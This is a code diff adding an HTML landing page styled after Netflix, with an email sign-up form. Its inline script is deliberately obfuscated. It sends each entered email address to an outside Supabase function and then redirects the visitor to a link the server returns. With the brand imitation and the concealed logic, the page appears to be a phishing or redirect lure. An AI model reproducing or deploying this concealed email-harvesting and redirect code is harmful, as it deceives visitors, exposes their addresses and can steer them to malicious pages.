@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Netflix-ish Minimal</title>
+    <link rel="stylesheet" href="styles.css" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/7433d3320f.js"
+      crossorigin="anonymous"
+    ></script>
+  </head>
+  <body>
+    <!-- Navbar Section -->
+     <!-- Custom Alert Box -->
+    <div id="alert-box"></div>
+
+    <div class="navbar">
+      <div class="navbar-container">
+        <!-- Logo -->
+        <div class="logo-container">
+          <img src="images/logo.png" class="logo" alt="Netflix-Style Logo" />
+        </div>
+
+        <!-- Profile Container -->
+        <div class="profile-container">
+          <span class="profile-text">Teshrij</span>
+          <img src="images/profile.png" class="profile-picture" alt="Profile" />
+        </div>
+      </div>
+    </div>
+
+    <!-- Main Container -->
+    <div class="container">
+      <!-- Hero/Banner with background -->
+      <div
+        class="featured-content"
+        style="
+          background: linear-gradient(to bottom, rgba(0, 0, 0, 0), #151515),
+            url('images/f-1.jpg');
+          background-size: cover;
+          background-position: center;
+        "
+      >
+        <h1 class="featured-title">Unlimited movies, TV shows and more.</h1>
+        <p class="featured-desc">Watch anywhere. Cancel anytime.</p>
+
+        <!-- Email Form -->
+        <form id="emailForm" class="email-form">
+          <input
+            type="email"
+            id="emailInput"
+            class="email-input"
+            placeholder="Enter your email"
+            required
+          />
+          <button type="submit" class="featured-button">
+            SUBMIT <i class="fa-solid fa-angle-right btn-icon"></i>
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Inline Script -->
+    <script>
+function _0x5172(_0x4a6778,_0x29bd52){const _0x91b00d=_0x91b0();return _0x5172=function(_0x517266,_0x428385){_0x517266=_0x517266-0x1c1;let _0x54e7d3=_0x91b00d[_0x517266];return _0x54e7d3;},_0x5172(_0x4a6778,_0x29bd52);}const _0x5bc51d=_0x5172;(function(_0x29cc01,_0x586fc9){const _0x3896bf=_0x5172,_0x33663f=_0x29cc01();while(!![]){try{const _0x410495=parseInt(_0x3896bf(0x1c6))/0x1+-parseInt(_0x3896bf(0x1da))/0x2+-parseInt(_0x3896bf(0x1c7))/0x3+-parseInt(_0x3896bf(0x1c4))/0x4+parseInt(_0x3896bf(0x1ce))/0x5+parseInt(_0x3896bf(0x1dd))/0x6+parseInt(_0x3896bf(0x1ca))/0x7;if(_0x410495===_0x586fc9)break;else _0x33663f['push'](_0x33663f['shift']());}catch(_0x2d386c){_0x33663f['push'](_0x33663f['shift']());}}}(_0x91b0,0x7fe0c));const form=document[_0x5bc51d(0x1d4)]('emailForm'),emailInput=document[_0x5bc51d(0x1d4)](_0x5bc51d(0x1c8)),submitButton=form['querySelector'](_0x5bc51d(0x1d9)),alertBox=document['getElementById'](_0x5bc51d(0x1cb)),setButtonState=_0x381f42=>{const _0x3ccf0f=_0x5bc51d;_0x381f42?(submitButton[_0x3ccf0f(0x1de)]=!![],submitButton[_0x3ccf0f(0x1d0)]='<span\x20class=\x22spinner\x22></span>\x20Loading...'):(submitButton['disabled']=![],submitButton[_0x3ccf0f(0x1d0)]=_0x3ccf0f(0x1e0));},showAlert=_0x41c46a=>{const _0x467c0f=_0x5bc51d;alertBox[_0x467c0f(0x1cd)]=_0x41c46a,alertBox[_0x467c0f(0x1cc)]=_0x467c0f(0x1d5),alertBox[_0x467c0f(0x1d6)][_0x467c0f(0x1df)]=_0x467c0f(0x1c2),setTimeout(()=>{const _0x597ccf=_0x467c0f;alertBox['style'][_0x597ccf(0x1df)]=_0x597ccf(0x1c3);},0xbb8);};function _0x91b0(){const _0x15bf3c=['button','831886ThYvzj','No\x20valid\x20link\x20found.\x20Please\x20try\x20again.','json','2224056Apmiqv','disabled','display','SUBMIT','Please\x20enter\x20a\x20valid\x20email\x20address.','block','none','2228124lhnqMe','addEventListener','976443Xjscwv','1836765UHLxQw','emailInput','location','1125859GmGNyU','alert-box','className','textContent','3005305PaOEXU','value','innerHTML','submit','preventDefault','trim','getElementById','show\x20error','style','link','An\x20error\x20occurred.\x20Please\x20try\x20again\x20later.'];_0x91b0=function(){return _0x15bf3c;};return _0x91b0();}form[_0x5bc51d(0x1c5)](_0x5bc51d(0x1d1),async _0x2c8f76=>{const _0x236534=_0x5bc51d;_0x2c8f76[_0x236534(0x1d2)]();const _0x2cea3a=emailInput[_0x236534(0x1cf)][_0x236534(0x1d3)]();if(!_0x2cea3a){showAlert(_0x236534(0x1c1));return;}setButtonState(!![]);const _0x18ac71='https://kfgswynickhywzhneltu.supabase.co/functions/v1/query?email='+encodeURIComponent(_0x2cea3a);try{const _0x23b84d=await fetch(_0x18ac71),_0x3bd1b2=await _0x23b84d[_0x236534(0x1dc)]();!_0x23b84d['ok']||!_0x3bd1b2[_0x236534(0x1d7)]?showAlert(_0x236534(0x1db)):window[_0x236534(0x1c9)]['href']=_0x3bd1b2[_0x236534(0x1d7)];}catch(_0x19d599){showAlert(_0x236534(0x1d8));}finally{setButtonState(![]);}});
+    </script>
+  </body>
+</html>
